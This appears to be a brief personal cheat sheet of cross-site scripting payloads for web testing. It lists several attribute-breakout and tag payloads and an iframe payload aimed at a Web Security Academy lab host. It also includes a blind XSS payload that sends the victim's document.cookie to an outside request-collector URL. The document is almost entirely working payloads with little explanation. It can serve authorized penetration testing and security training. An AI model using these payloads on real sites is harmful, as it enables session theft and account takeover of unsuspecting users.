# XSS Methodology

## Payload
*Basic*
```html
<script>alert(0)</script>
```

**img**
```html
<img src=x onerror=print()>
```

**href attribute**
```html
href="javascript:alert(1)"
```

**autofocus**
```html
x" onfocus=alert(1) autofocus tabindex=1>
```

**onmouseover**

```html
"onmouseover="alert(1)
```


**blind xss**
[requestBin](https://public.requestbin.com)
```html
><script>document.location='https://enp0qp6rqroqc.x.pipedream.net?c='+document.cookie</script>
```

**iframe**
```html
<iframe src="https://0a9800c3034ba0e181fafc8700b00051.web-security-academy.net/#" onload=this.src+="%3Cimg%20src=x%20onerror=print()%3E">
</iframe>

```
## Links
[Ghetto XSS Cheatsheet](https://d3adend.org/xss/ghettoBypass)